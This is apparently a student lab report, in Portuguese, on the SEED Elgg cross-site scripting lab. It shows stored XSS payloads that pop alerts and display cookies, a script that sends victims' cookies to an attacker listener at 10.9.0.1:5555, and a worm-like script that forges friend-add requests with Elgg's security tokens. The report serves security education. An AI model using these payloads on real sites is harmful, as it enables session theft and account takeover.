# Relatório: Cross-Site Scripting (XSS) Attack Lab (Web Application: Elgg)

## Questão 1

### Task 1: Posting a Malicious Message to Display an Alert Window

O objetivo desta tarefa é incorporar um programa JavaScript no perfil da plataforma Elgg, de modo a que, quando outro utilizador visualize o perfil, o programa JavaScript seja executado e uma janela de alerta seja exibida.

O código JavaScript utilizado para esta tarefa é o seguinte:

``` javascript
<script>alert('XSS');</script>
```

Se este código for inserido no campo de descrição breve do perfil, qualquer utilizador que visualize o perfil verá uma janela de alerta.

### Passos Realizados

1. Acesso ao Elgg e Autenticação
- Acededemos ao site Elgg em www.seed-server.com.
- Efetuámos login com as seguintes credenciais:
<br>
Username: samy
<br>
Password: seedsamy

![Figura 1](/Images/LOGBOOK7/Task1_image1.png)

2. Inserção de Código Malicioso
- Naveguei até ao perfil do utilizador.
- No campo Brief Description, inseri o seguinte código malicioso:
html
- Inserímos o script malicioso.
- Guardámos as alterações do perfil.

![Figura 2](/Images/LOGBOOK7/Task1_image2.png)

3. Validação do Comportamento
- Após a atualização do perfil, visualizámos o perfil novamente.
- O código JavaScript foi executado automaticamente, resultando na exibição de uma janela de alerta com a mensagem "XSS".

![Figura 3](/Images/LOGBOOK7/Task1_image3.png)

### Task 2: Posting a Malicious Message to Display Cookies

O objetivo desta tarefa foi incorporar um programa em JavaScript no perfil do Elgg, de modo que, quando outro utilizador visualizasse o perfil, os cookies do navegador do utilizador fossem exibidos numa janela de alerta.

### Passos Realizados:
1. Inserção do Código Malicioso no Perfil
Navegámos novamente para a secção de edição do perfil no Elgg. No campo "Breve descrição", inserímos o seguinte código JavaScript:

```javascript
<script>alert(document.cookie);</script>
```
Este código aciona uma janela de alerta que exibe os cookies do utilizador sempre que alguém visualiza o perfil.

![Figura 4](/Images/LOGBOOK7/Task2_image1.png)

2. Validação do Funcionamento do Código
- Após guardar as alterações, visualizei o perfil novamente como visitante. O alerta exibiu com sucesso os cookies armazenados, neste caso, exibindo a cookie de sessão ativa do Elgg.

![Figura 5](/Images/LOGBOOK7/Task2_image2.png)

###  Task 3: Stealing Cookies from the Victim’s Machine

Nesta tarefa, o objetivo era modificar o código malicioso de forma que os cookies do utilizador fossem enviados para a máquina do atacante. O código JavaScript adiciona uma etiqueta <img> ao perfil, com o atributo src configurado para o endereço IP e a porta de escuta do atacante. Quando o navegador tenta carregar a imagem, um pedido HTTP GET é enviado, incluindo os cookies no URL.

### Passos Realizados

1. Inserção do Código Malicioso no Perfil
- Navegámos para a secção de edição do perfil no Elgg e inserímos o seguinte código JavaScript no campo "Breve descrição":

```javascript
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');</script>
```

Este código injeta uma imagem no perfil, cujo src contém os cookies como parâmetro de consulta.

![Figura 6](/Images/LOGBOOK7/Task3_image1.png)

2. Preparação da Máquina do Atacante
- Iniciámos um servidor TCP na nossa máquina (com IP 10.9.0.1) para escutar conexões na porta 5555. Usámos o comando nc para configurar o servidor:

![Figura 7](/Images/LOGBOOK7/Task3_image2.png)

3. Validação do Roubo de Cookies
- Depois de guardarmos o perfil com o código malicioso, utilizámos outra conta para visualizar o perfil.

![Figura 8](/Images/LOGBOOK7/Task3_image3.png)

- Assim que o perfil foi carregado, o navegador da vítima enviou um pedido HTTP para o servidor do atacante, incluindo os cookies no URL.

![Figura 9](/Images/LOGBOOK7/Task3_image4.png)

![Figura 10](/Images/LOGBOOK7/Task3_image5.png)

![Figura 11](/Images/LOGBOOK7/Task3_image6.png)

###  Task 4: Becoming the Victim’s Friend

Nesta tarefa, o objetivo foi desenvolver um código malicioso em JavaScript que, ao ser carregado no perfil de um utilizador atacante (neste caso, foi selecionado o utilizador Samy), adiciona automaticamente o utilizador atacante como amigo de qualquer vítima que visualize o seu perfil. Este ataque simula o comportamento do famoso Samy Worm.

### Passos Realizados:
1. Identificar o Comportamento de Adicionar Amigo
- Começámos por observar como um pedido legítimo de adicionar amigo é enviado no Elgg. Utilizámos o HTTP Header Live no Firefox para inspecionar os parâmetros de um pedido real ao adicionar um amigo.

![Figura 12](/Images/LOGBOOK7/Task4_image1.png)

2. Inspeção do Pedido HTTP
- Identificámos os parâmetros necessários do pedido GET utilizado para adicionar um amigo.

![Figura 13](/Images/LOGBOOK7/Task4_image2.png)

3. Criação do Código Malicioso
- Com base nos parâmetros capturados, escrevemos o seguinte código JavaScript, que simula um pedido legítimo para adicionar Samy como amigo, sem intervenção da vítima:

```javascript
<script type="text/javascript">
window.onload = function () {
        var Ajax = null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
}
</script>
```

O código foi inserido no campo "About me" do perfil do utilizador Samy, garantindo que seria executado sempre que outro utilizador visualizasse o perfil.

![Figura 15](/Images/LOGBOOK7/Task4_image3.png)

4. Execução e Validação do Ataque
- Quando a vítima (Alice) visualizou o perfil de Samy, o código foi executado, enviando automaticamente um pedido para adicionar Samy como amigo.

![Figura 16](/Images/LOGBOOK7/Task4_image4.png)

![Figura 17](/Images/LOGBOOK7/Task4_image5.png)

- Após a execução do código, o utilizador Samy foi adicionado à lista de amigos de Alice sem que esta precisasse realizar qualquer ação.

![Figura 18](/Images/LOGBOOK7/Task4_image6.png)

![Figura 19](/Images/LOGBOOK7/Task4_image7.png)

#### Question 1: Explain the purpose of Lines ➀ and ➁, why are they needed?

- Line ➀ (__elgg_ts): Este parâmetro (__elgg_ts) é um token de timestamp gerado pelo servidor Elgg para cada sessão. Ele ajuda a garantir que as requisições enviadas para o servidor sejam recentes e não foram manipuladas ou reutilizadas (proteção contra replay attacks). O valor é verificado pelo servidor para validar a legitimidade do pedido.

#### Question 2: If the Elgg application only provides the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

- Se o campo "About Me" estiver limitado ao Editor mode, o Elgg inserirá automaticamente tags HTML adicionais (como ```<p>``` ou ```<br>```) ao conteúdo do campo, o que pode quebrar ou invalidar o código JavaScript malicioso. Nessa situação, o ataque pode falhar porque o código não será executado corretamente.

- No entanto, ainda é possível lançar um ataque bem-sucedido com as seguintes abordagens:

- Codificação de Caracteres: Utilizar métodos para codificar o código JavaScript, como inserção de códigos HTML entities, que podem ser decodificados e executados no lado do cliente.
Abusar de Funções Inline: Se o Editor mode permitir adicionar atributos personalizados em tags HTML (como onload, onclick), um script malicioso poderia ser incluído em uma dessas tags, como ```"<img onerror="alert('XSS')">```.

## Questão 2

#### Em qual/quais modalidades de ataques XSS este ataque se enquadra e porquê?

O ataque descrito no relatório enquadra-se na modalidade de Stored XSS (ou persistente).

Stored XSS ocorre quando o código malicioso é armazenado permanentemente no servidor, geralmente em campos como descrições de perfil, comentários ou postagens. Sempre que um utilizador acede à página que contém o conteúdo malicioso, o script é carregado e executado no navegador da vítima. Neste caso, o código JavaScript malicioso foi inserido no campo "About Me" do perfil do utilizador Samy. Assim, qualquer utilizador que visualizasse o perfil de Samy seria automaticamente alvo do ataque.

Justificação:
Persistência do Código Malicioso: O código JavaScript inserido é armazenado no servidor e é executado sempre que um outro utilizador visita a página do perfil que contém o script.
Ativação Automática para Todos os Visitantes: O ataque não requer interação adicional por parte da vítima além de visualizar o perfil.
Por que não é Reflected ou DOM?

Reflected XSS ocorre quando o código malicioso não é armazenado no servidor, mas é refletido diretamente ao utilizador como parte da resposta do servidor (normalmente através de parâmetros de URL). Este não é o caso aqui, pois o script foi guardado no servidor.
DOM-based XSS baseia-se na manipulação do DOM no lado do cliente sem qualquer interação direta com o servidor para incluir ou armazenar o script malicioso. Neste caso, o script é servido diretamente pelo servidor e não é gerado dinamicamente pelo DOM no lado do cliente.
Portanto, este ataque é claramente um exemplo de Stored XSS.